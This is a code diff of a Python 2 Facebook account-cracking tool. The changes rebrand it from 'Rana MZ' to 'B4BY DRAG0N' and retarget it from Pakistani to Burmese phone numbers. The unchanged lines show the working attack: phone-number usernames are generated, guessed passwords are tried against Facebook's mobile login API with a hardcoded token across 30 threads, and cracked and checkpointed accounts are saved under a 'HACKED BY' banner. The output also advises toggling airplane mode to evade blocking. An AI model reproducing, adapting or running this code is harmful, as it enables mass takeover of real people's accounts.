@@ -71,7 +71,7 @@ logo='''
  '''                                                                                                                                                                                                                                                                                                                                                  
 
 CorrectUsername = "8484"
-CorrectPassword = "99834"
+CorrectPassword = "9G84"
  
 loop = 'true'
 while (loop == 'true'):
@@ -98,7 +98,7 @@ id = []
 def menu():
 	os.system('clear')
 	print logo
-	print "\033[1;92m         [ Rana MZ { NAM TU SUNA HUGA } ]"
+	print "\033[1;92m    [ B4BY DRAG0N { TECHN0L0GY BY M4RMU } ]"
 	print
         print "\033[1;91m          SELECT ANY ONE OPERATOR"
 	print "\033[1;92m[1]\033[1;97m╼╼\033[1;93mMOBILINK     (Press 1)"
@@ -140,7 +140,7 @@ def action():
 		print "\033[1;91m45, 64, ??, ??, ??,"
 		try:
 			c = raw_input(" \033[1;91m◢◀\x1b[1;92mSELECTED ANYONE CODE\x1b[1;91m▶◣ \033[1;97m: \033[1;97m")
-			k="+923"
+			k="+95"
 			idlist = ('.txt')
 			for line in open(idlist,"r").readlines():
 				id.append(line.strip())
@@ -183,11 +183,11 @@ def action():
 	elif bch =="5":			
 		os.system("clear")
 		print (logo)
-		print "\x1b[1;91m\033[1;97mBURMA PHONE CODE HERE\x1b[1;92m◈◈◈◈◈"		
+		print "\x1b[1;91m🍁🍁🍁🍁🍁\033[1;97mENTER BURMA PHONE CODE HERE\x1b[1;92m🍁🍁🍁🍁🍁"		
 		print "\033[1;96m20, 51, 25, 42, 33, 73, 26, 78,"
 		print "\033[1;96m79, 65, 96, 94, 86, 69, 68, 97,"
 		try:
-			c = raw_input(" \033[1;91m◢◀\x1b[1;92mSELECTED ANYONE CODE\x1b[1;91m▶◣ \033[1;97m: \033[1;97m")
+			c = raw_input(" \033[1;95m◢◀\x1b[1;92mSELECTED ANY CODE\x1b[1;91m▶◣ \033[1;97m: \033[1;97m")
 			k="+959"
 			idlist = ('.txt')
 			for line in open(idlist,"r").readlines():
@@ -217,13 +217,13 @@ def action():
 		action()
  
 	xxx = str(len(id))
-	psb ('[✓] \033[1;96mTotal Numbers: '+xxx)
+	psb ('[✓] \033[1;95mTotal Numbers: '+xxx)
 	time.sleep(0.5)
 	psb ('[✓] \033[1;92mPlease wait, process is running ...')
 	time.sleep(0.5)
 	psb ('[✓] \033[1;93mif U show No Result Use 5 Second Airplane Mode ...')
 	time.sleep(0.5)
-	psb ('[!] \033[1;95mPress CTRL Then Press Z To Stop This Process')
+	psb ('[!] \033[1;96mPress CTRL Then Press Z To Stop This Process')
 	time.sleep(0.5)
 	print 50*'\033[1;90m~'
 	print
@@ -275,14 +275,14 @@ def action():
 							data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			                                q = json.load(data)
 							if 'access_token' in q:
-								print '\x1b[1;92m[ iD iZ Ok =HACKED BY RANA MZ ]\x1b[1;92m-\x1b[1;92m(u)\x1b[1;92m-' + k + c + user + '-\x1b[1;92m(p)\x1b[1;92m-' + pass3
+								print '\x1b[1;92m[ iD iZ Ok =HACKED BY MM ]\x1b[1;92m-\x1b[1;92m(u)\x1b[1;92m-' + k + c + user + '-\x1b[1;92m(p)\x1b[1;92m-' + pass3
 								okb = open('save/successfull.txt', 'a')
 								okb.write(k+c+user+'|'+pass3+'\n')
 								okb.close()
 								oks.append(c+user+pass3)
 							else:	
 								if 'www.facebook.com' in q['error_msg']:
-									print '\x1b[1;95mRanaMZ \x1b[1;95m[iD iZ CP]\x1b[1;95m-\x1b[1;95m[user]\x1b[1;95m-' + k + c + user + '-\x1b[1;95m[pass]\x1b[1;95m-' + pass3
+									print '\x1b[1;95mB4BY DG \x1b[1;95m[iD iZ CP]\x1b[1;95m-\x1b[1;95m[user]\x1b[1;95m-' + k + c + user + '-\x1b[1;95m[pass]\x1b[1;95m-' + pass3
 									cps = open('save/checkpoint.txt', 'a')
 									cps.write(k+c+user+'|'+pass3+'\n')
 									cps.close()
@@ -295,9 +295,9 @@ def action():
 	p = ThreadPool(30)
 	p.map(main, id)
 	print 50*'-'
-	print '[✓] Process Has Been Completed ....'
-	print '[✓] Total OK/CP : '+str(len(oks))+'/'+str(len(cpb))
-	print('[✓] CP File Has Been Saved : save/checkpoint.txt')
+	print '[🍁] Process Has Been Completed ....'
+	print '[🍁] Total OK/CP : '+str(len(oks))+'/'+str(len(cpb))
+	print('[🍁] CP File Has Been Saved : save/checkpoint.txt')
 	raw_input('\n[Press Enter To Go Back]')
 	os.system('python2 .README.md')
 		
